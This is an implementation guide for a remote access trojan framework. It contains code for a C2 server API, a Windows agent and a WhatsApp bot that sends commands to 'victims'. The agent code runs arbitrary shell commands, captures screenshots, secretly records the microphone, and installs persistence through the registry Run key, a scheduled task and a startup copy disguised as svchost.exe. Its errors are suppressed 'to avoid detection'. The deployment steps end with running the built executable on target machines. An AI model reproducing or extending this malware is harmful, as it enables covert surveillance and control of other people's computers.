# 🚀 T0OL-B4S3-263 IMPLEMENTATION GUIDE

## Overview
This document provides step-by-step guidance for implementing the 27-task overhaul plan for the T0OL-B4S3-263 RAT framework. It explains which files to modify, what code to add, and how components integrate.

---

## 📦 NEW FILES CREATED

### 1. **umbrella_config.yaml** (Root Directory)
- **Purpose**: Master configuration file for all components
- **Status**: ✅ CREATED
- **Usage**: All components import from this file
- **Key Sections**:
  - `server`: C2 backend configuration
  - `agent`: RAT executable configuration
  - `bot`: WhatsApp bot configuration
  - `security`: Encryption, authentication, validation
  - `features`: Capability toggles
  - `deployment_modes`: Pre-configured profiles (LocalTest, RemoteServer, HybridMode)

### 2. **config_loader.py** (Root Directory)
- **Purpose**: Unified configuration loader for all components
- **Status**: ✅ CREATED
- **Usage**: `from config_loader import get_config; cfg = get_config()`
- **Key Features**:
  - Singleton pattern for global access
  - YAML parsing and validation
  - Environment variable overrides
  - Configuration change detection
  - Dot-notation access (e.g., `cfg.get('server.listen_port')`)
  - Persistent updates to umbrella_config.yaml

---

## 🛠️ FILE MODIFICATIONS NEEDED

### Phase 1: Server Enhancement (rat_server_fixed.py)

#### Step 1.1: Add Configuration Integration
```python
# At top of rat_server_fixed.py
from config_loader import get_config
from datetime import datetime
import json
import sqlite3

# Initialize config
CONFIG = get_config()

# Update global variables
SESSIONS = {}
SESSION_LOCK = threading.Lock()
SERVER_CONFIG = CONFIG.get_server_config()
LISTEN_IP = SERVER_CONFIG.get('listen_ip', '0.0.0.0')
LISTEN_PORT = SERVER_CONFIG.get('listen_port', 4444)
API_PORT = SERVER_CONFIG.get('api_port', 5000)
```

#### Step 1.2: Implement Heartbeat & Reconnection
```python
# Add to Server class
def heartbeat_manager(self):
    """
    Monitor agent connections and send heartbeats.
    Marks agents as offline if no response after timeout.
    """
    timeout = CONFIG.get('server.callback_timeout', 30)
    
    while SERVER_RUNNING:
        with SESSION_LOCK:
            current_time = time.time()
            offline_agents = []
            
            for agent_id, session in SESSIONS.items():
                last_activity = session.get('last_activity', current_time)
                
                if current_time - last_activity > timeout:
                    offline_agents.append(agent_id)
                    self.alert_system.create_alert(
                        'agent_offline',
                        f"Agent {agent_id} offline - no activity for {timeout}s",
                        severity='warning'
                    )
        
        # Remove offline agents
        for agent_id in offline_agents:
            del SESSIONS[agent_id]
        
        time.sleep(CONFIG.get('server.heartbeat_interval', 30))
```

#### Step 1.3: Implement Alert System
```python
# Add new AlertSystem class
class AlertSystem:
    """Centralized alert management"""
    
    def __init__(self):
        self.alerts = []
        self.db_path = CONFIG.get('server.database.path', 'data/rat_sessions.db')
        self.init_alerts_table()
    
    def init_alerts_table(self):
        """Create alerts table in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY,
                type TEXT,
                message TEXT,
                severity TEXT,
                timestamp DATETIME,
                agent_id TEXT,
                read BOOLEAN DEFAULT 0
            )
        ''')
        conn.commit()
        conn.close()
    
    def create_alert(self, alert_type: str, message: str, 
                     severity: str = 'info', agent_id: str = None):
        """Create and store alert"""
        alert = {
            'type': alert_type,
            'message': message,
            'severity': severity,
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'read': False
        }
        self.alerts.append(alert)
        self._persist_alert(alert)
    
    def _persist_alert(self, alert: dict):
        """Store alert in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO alerts (type, message, severity, timestamp, agent_id)
            VALUES (?, ?, ?, ?, ?)
        ''', (alert['type'], alert['message'], alert['severity'],
              alert['timestamp'], alert['agent_id']))
        conn.commit()
        conn.close()
    
    def get_unread_alerts(self):
        """Get all unread alerts"""
        return [a for a in self.alerts if not a['read']]
```

#### Step 1.4: Implement REST API with Flask
```python
# Add to rat_server_fixed.py
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """List all connected agents with status"""
    agents = []
    with SESSION_LOCK:
        for agent_id, session in SESSIONS.items():
            agents.append({
                'id': agent_id,
                'ip': session.get('addr')[0],
                'port': session.get('addr')[1],
                'hostname': session.get('info', {}).get('hostname'),
                'os': session.get('info', {}).get('os'),
                'last_activity': session.get('last_activity'),
                'status': 'online'
            })
    return jsonify({'agents': agents})

@app.route('/api/agents/<agent_id>/execute', methods=['POST'])
def execute_command(agent_id):
    """Execute command on specific agent"""
    command = request.json.get('command')
    timeout = CONFIG.get('server.execution.timeout_per_command', 120)
    
    if agent_id not in SESSIONS:
        return jsonify({'error': 'Agent not found'}), 404
    
    try:
        # Send command to agent
        agent_socket = SESSIONS[agent_id]['socket']
        agent_socket.sendall(command.encode() + b'\n')
        
        # Wait for response
        output = b''
        agent_socket.settimeout(timeout)
        while True:
            try:
                chunk = agent_socket.recv(4096)
                if not chunk:
                    break
                output += chunk
            except socket.timeout:
                break
        
        return jsonify({'output': output.decode('utf-8', errors='ignore')})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/alerts', methods=['GET'])
def get_agent_alerts(agent_id):
    """Get all alerts for specific agent"""
    alerts = [a for a in alert_system.get_unread_alerts() 
              if a.get('agent_id') == agent_id]
    return jsonify({'alerts': alerts})

# Start API server in background
def start_api_server():
    api_port = CONFIG.get('server.api_port', 5000)
    api_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=api_port, debug=False),
        daemon=True
    )
    api_thread.start()
```

---

### Phase 2: Agent Enhancement (rat_ultimate.py)

#### Step 2.1: Add Configuration Integration
```python
# At top of rat_ultimate.py
from config_loader import get_config
import base64

CONFIG = get_config()

# Get connection parameters
AGENT_CONFIG = CONFIG.get_agent_config()
C2_SERVER = AGENT_CONFIG.get('callback_ip', '127.0.0.1')
C2_PORT = AGENT_CONFIG.get('callback_port', 4444)
ENCRYPTION_KEY = AGENT_CONFIG.get('encryption_key')
```

#### Step 2.2: Implement Real Command Execution
```python
# Replace mock execution with real execution
def execute_real_command(command: str) -> str:
    """Execute real Windows command and return output"""
    try:
        shell = CONFIG.get('agent.execution.shell', 'cmd.exe')
        timeout = CONFIG.get('agent.execution.timeout_per_command', 120)
        
        # Handle PowerShell commands
        if command.strip().startswith('ps '):
            shell = 'powershell.exe'
            command = command[3:]
        
        # Execute with subprocess
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        # Combine stdout and stderr
        output = result.stdout
        if result.stderr:
            output += f"\n[ERROR] {result.stderr}"
        
        return output if output else "[No output]"
    
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out"
    except Exception as e:
        return f"[ERROR] {str(e)}"

# Replace all mock execution calls with this function
```

#### Step 2.3: Implement Real Screenshot Capture
```python
# Replace mock screenshot with real capture
def capture_screenshot_real(quality: int = None) -> str:
    """
    Capture real screenshot and return as base64.
    """
    try:
        if quality is None:
            quality = CONFIG.get('agent.media.screenshot.quality', 85)
        
        import mss
        from PIL import Image
        import io
        
        # Capture screen
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Convert to PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            
            # Compress
            img_buffer = io.BytesIO()
            img.save(img_buffer, format='JPEG', quality=quality)
            img_data = img_buffer.getvalue()
            
            # Return as base64
            return base64.b64encode(img_data).decode()
    
    except Exception as e:
        return f"[ERROR] Screenshot failed: {str(e)}"
```

#### Step 2.4: Implement Real Audio Recording
```python
# Add audio recording capability
def record_audio_real(duration: int = None) -> str:
    """Record audio from microphone and return as base64."""
    try:
        if duration is None:
            duration = CONFIG.get('agent.media.audio.duration', 30)
        
        import pyaudio
        import wave
        import io
        
        CHUNK = 1024
        FORMAT = pyaudio.paFloat32
        CHANNELS = 1
        RATE = CONFIG.get('agent.media.audio.sample_rate', 44100)
        
        # Initialize audio
        p = pyaudio.PyAudio()
        stream = p.open(
            format=FORMAT,
            channels=CHANNELS,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK
        )
        
        # Record
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Save to WAV in memory
        wav_buffer = io.BytesIO()
        with wave.open(wav_buffer, 'wb') as wav_file:
            wav_file.setnchannels(CHANNELS)
            wav_file.setsampwidth(p.get_sample_size(FORMAT))
            wav_file.setframerate(RATE)
            wav_file.writeframes(b''.join(frames))
        
        wav_data = wav_buffer.getvalue()
        
        # Convert to MP3 if auto_compression enabled
        if CONFIG.get('agent.media.audio.auto_compression', True):
            # Use ffmpeg for MP3 conversion
            # subprocess.run(['ffmpeg', ...])
            pass
        
        return base64.b64encode(wav_data).decode()
    
    except Exception as e:
        return f"[ERROR] Audio recording failed: {str(e)}"
```

#### Step 2.5: Implement Robust Persistence
```python
# Add to Agent class
class PersistenceManager:
    """Implement multiple persistence techniques"""
    
    def install_persistence(self):
        """Install agent for auto-startup"""
        methods = CONFIG.get('agent.persistence.methods', [])
        
        for method in methods:
            try:
                if method == 'registry_run_key':
                    self._persist_registry()
                elif method == 'scheduled_task':
                    self._persist_scheduled_task()
                elif method == 'startup_folder':
                    self._persist_startup_folder()
            except Exception as e:
                pass  # Silently fail to avoid detection
    
    def _persist_registry(self):
        """Add to Windows registry Run key"""
        try:
            import winreg
            exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, 'UpdateService', 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass
    
    def _persist_scheduled_task(self):
        """Create Windows scheduled task"""
        try:
            exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
            task_name = 'SystemUpdate'
            
            cmd = f'''schtasks /create /tn {task_name} /tr "{exe_path}" /sc onlogon /f'''
            os.system(cmd)
        except:
            pass
    
    def _persist_startup_folder(self):
        """Place shortcut in Startup folder"""
        try:
            startup_path = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
            exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Create shortcut (would need pyshortcuts or similar)
            shutil.copy(exe_path, os.path.join(startup_path, 'svchost.exe'))
        except:
            pass
```

---

### Phase 3: WhatsApp Bot Enhancement (whatsapp-c2/bot.js)

#### Step 3.1: Add Server API Integration
```javascript
// At top of bot.js
const axios = require('axios');
const fs = require('fs');
const yaml = require('js-yaml');

// Load configuration
let config = {};
try {
    const configFile = fs.readFileSync('../umbrella_config.yaml', 'utf8');
    config = yaml.load(configFile);
} catch (e) {
    console.error('Failed to load config:', e);
    process.exit(1);
}

const SERVER_URL = process.env.RAT_SERVER_URL || config.bot.server_url;
const API_KEY = process.env.RAT_API_KEY || config.bot.server_api_key;
const CHECK_ALERTS_INTERVAL = config.bot.check_alerts_interval || 5000;

// API Helper
async function apiCall(endpoint, method = 'GET', data = null) {
    try {
        const response = await axios({
            method,
            url: `${SERVER_URL}${endpoint}`,
            data,
            headers: {
                'Authorization': `Bearer ${API_KEY}`,
                'Content-Type': 'application/json'
            },
            timeout: 30000
        });
        return response.data;
    } catch (error) {
        console.error(`API error: ${endpoint}`, error.message);
        return null;
    }
}
```

#### Step 3.2: Implement Real-Time Alert Polling
```javascript
// Add to bot initialization
let activeAgent = null;
let alertCheckInterval = null;

async function startAlertPolling() {
    alertCheckInterval = setInterval(async () => {
        try {
            const response = await apiCall('/api/alerts/unread');
            
            if (response && response.alerts) {
                for (const alert of response.alerts) {
                    await handleAlert(alert);
                }
            }
        } catch (error) {
            console.error('Alert polling error:', error);
        }
    }, CHECK_ALERTS_INTERVAL);
}

async function handleAlert(alert) {
    const message = formatAlertMessage(alert);
    
    // Send to owner
    const owner = config.bot.whatsapp.owner_numbers[0];
    await client.sendMessage(owner, { text: message });
    
    // Mark as read
    await apiCall(`/api/alerts/${alert.id}/read`, 'POST');
}

function formatAlertMessage(alert) {
    const emoji = {
        'new_victim': '🚨',
        'config_change': '⚙️',
        'command_failed': '❌',
        'high_risk_action': '⚠️',
        'media_available': '📸',
        'agent_offline': '🔴'
    };
    
    return `${emoji[alert.type] || '📢'} ${alert.message}`;
}
```

#### Step 3.3: Implement Command Execution via Server
```javascript
// Replace mock command execution
async function executeRemoteCommand(agentId, command) {
    try {
        const response = await apiCall(
            `/api/agents/${agentId}/execute`,
            'POST',
            { command }
        );
        
        if (response && response.output) {
            return response.output;
        }
        
        return '[ERROR] Command execution failed';
    } catch (error) {
        return `[ERROR] ${error.message}`;
    }
}

// Update command handlers to use this function
client.on('message', async (message) => {
    // ... existing code ...
    
    if (message.body.startsWith(config.bot.whatsapp.bot_prefix)) {
        const command = message.body.slice(config.bot.whatsapp.bot_prefix.length).trim();
        
        if (!activeAgent) {
            await message.reply('No agent selected. Use /agents to list.');
            return;
        }
        
        const output = await executeRemoteCommand(activeAgent, command);
        
        // Format and send output
        const maxLength = config.bot.formatting.max_message_length || 4096;
        if (output.length > maxLength) {
            const chunks = output.match(new RegExp('.{1,' + maxLength + '}', 'g'));
            for (const chunk of chunks) {
                await message.reply(chunk);
            }
        } else {
            await message.reply(output);
        }
    }
});
```

#### Step 3.4: Implement Agent List & Switch
```javascript
// /agents command
async function handleAgentsCommand(message) {
    const response = await apiCall('/api/agents');
    
    if (!response || !response.agents || response.agents.length === 0) {
        await message.reply('No agents connected');
        return;
    }
    
    let text = '📊 *Connected Agents:*\n\n';
    response.agents.forEach((agent, index) => {
        text += `${index + 1}. *${agent.hostname}*\n`;
        text += `   ID: \`${agent.id}\`\n`;
        text += `   IP: ${agent.ip}\n`;
        text += `   OS: ${agent.os}\n`;
        text += `   Status: ${agent.status}\n\n`;
    });
    
    text += 'Use /switch <number> to select';
    await message.reply(text);
}

// /switch <agent_index> command
async function handleSwitchCommand(message, agentIndex) {
    const response = await apiCall('/api/agents');
    
    if (!response || !response.agents) {
        await message.reply('Failed to get agents');
        return;
    }
    
    const agents = response.agents;
    if (agentIndex < 1 || agentIndex > agents.length) {
        await message.reply('Invalid agent number');
        return;
    }
    
    activeAgent = agents[agentIndex - 1].id;
    await message.reply(`✅ Switched to *${agents[agentIndex - 1].hostname}*`);
}
```

---

## 🔄 COMPONENT INTEGRATION FLOW

```
USER (WhatsApp)
    ↓
    ├─→ /agents
    │   ↓
    │   Bot queries Server API
    │   ↓
    │   Server returns agent list from SESSIONS
    │   ↓
    │   Bot displays formatted agent list
    │
    ├─→ /switch <agent>
    │   ↓
    │   Bot sets activeAgent variable
    │   ↓
    │   Bot confirms switch
    │
    ├─→ /command
    │   ↓
    │   Bot sends to Server API: /agents/{id}/execute
    │   ↓
    │   Server sends command to Agent via socket
    │   ↓
    │   Agent executes real command
    │   ↓
    │   Agent returns output to Server
    │   ↓
    │   Server returns output to Bot API
    │   ↓
    │   Bot receives and formats output
    │   ↓
    │   Bot sends output to WhatsApp user

SERVER (Background Process)
    ↓
    ├─→ Accept agent connections on port 4444
    │   ├─→ Store session in SESSIONS dict
    │   ├─→ Create alert: "New victim connected"
    │   └─→ Send alert to alerting system
    │
    ├─→ Listen for API requests on port 5000
    │   ├─→ /agents - return SESSIONS data
    │   ├─→ /agents/{id}/execute - relay command
    │   └─→ /alerts - return stored alerts
    │
    └─→ Background threads
        ├─→ Heartbeat thread (every 30s)
        │   └─→ Mark agents offline if no activity
        │
        ├─→ Alert polling thread
        │   └─→ Make alerts available to Bot
        │
        └─→ Database maintenance
            └─→ Clean up old logs, rotate files

AGENT (Compromised Machine)
    ↓
    ├─→ Read config from umbrella_config.yaml (embedded or runtime)
    │   ├─→ C2_SERVER = 127.0.0.1 (or configured IP)
    │   └─→ C2_PORT = 4444
    │
    ├─→ Connect to Server on startup
    │   └─→ Send system info (hostname, OS, user, IP)
    │
    ├─→ Install persistence mechanisms
    │   ├─→ Add to registry Run key
    │   ├─→ Create scheduled task
    │   └─→ Copy to startup folder
    │
    ├─→ Main loop: listen for commands from Server
    │   └─→ When command received:
    │       ├─→ Execute real command
    │       ├─→ Capture output
    │       ├─→ Send output back to Server
    │       └─→ Update last_activity timestamp
    │
    ├─→ Heartbeat response (every 30s)
    │   └─→ Send "alive" signal to Server
    │
    └─→ Media capture on-demand
        ├─→ Screenshot: capture → compress → base64 → send
        ├─→ Audio: record → WAV → MP3 → send
        └─→ Server stores in loot/ directory
```

---

## 📊 Database Schema

### Agents Table
```sql
CREATE TABLE agents (
    id TEXT PRIMARY KEY,
    hostname TEXT,
    username TEXT,
    os TEXT,
    ip TEXT,
    port INTEGER,
    encryption_key TEXT,
    last_activity DATETIME,
    connected_at DATETIME,
    system_info JSON,
    status TEXT
);
```

### Commands Table
```sql
CREATE TABLE commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    command TEXT,
    output TEXT,
    executed_at DATETIME,
    executed_by TEXT,
    execution_time INTEGER,
    status TEXT,
    FOREIGN KEY(agent_id) REFERENCES agents(id)
);
```

### Alerts Table
```sql
CREATE TABLE alerts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    type TEXT,
    message TEXT,
    severity TEXT,
    created_at DATETIME,
    read BOOLEAN,
    read_at DATETIME
);
```

---

## 🔐 Security Implementation Checklist

- [ ] All network traffic encrypted with Fernet
- [ ] API authentication via Bearer token
- [ ] Input validation on all user commands
- [ ] SQL injection prevention (use parameterized queries)
- [ ] Command injection prevention (sanitize shell commands)
- [ ] Rate limiting on API endpoints
- [ ] Audit logging of all commands
- [ ] HTTPS in production (SSL/TLS)
- [ ] CORS configured properly
- [ ] Config file permissions locked down (0600)

---

## 🚀 Deployment Instructions

### Local Testing
```bash
# 1. Copy config to root
cp umbrella_config.yaml .

# 2. Install dependencies
pip install -r requirements.txt
npm install --prefix whatsapp-c2

# 3. Start server
python rat_server_fixed.py

# 4. Start bot
cd whatsapp-c2 && npm start

# 5. Run agent (on test machine)
python rat_ultimate.py
```

### Remote Deployment
1. Update umbrella_config.yaml with public IP/domain
2. Build agent: `python build_agent.py --output rat.exe`
3. Deploy to C2 server
4. Execute agent on target machines

---

## 📝 Next Steps

1. ✅ Unified config created
2. ✅ Config loader implemented
3. ⏳ Integrate config loader into rat_server_fixed.py
4. ⏳ Implement heartbeat and alert system
5. ⏳ Add REST API to server
6. ⏳ Update rat_ultimate.py for real execution
7. ⏳ Implement real screenshot and audio
8. ⏳ Add persistence mechanisms
9. ⏳ Update bot.js for API integration
10. ⏳ Implement alert polling
11. ⏳ Create comprehensive test suite
12. ⏳ Deploy and validate

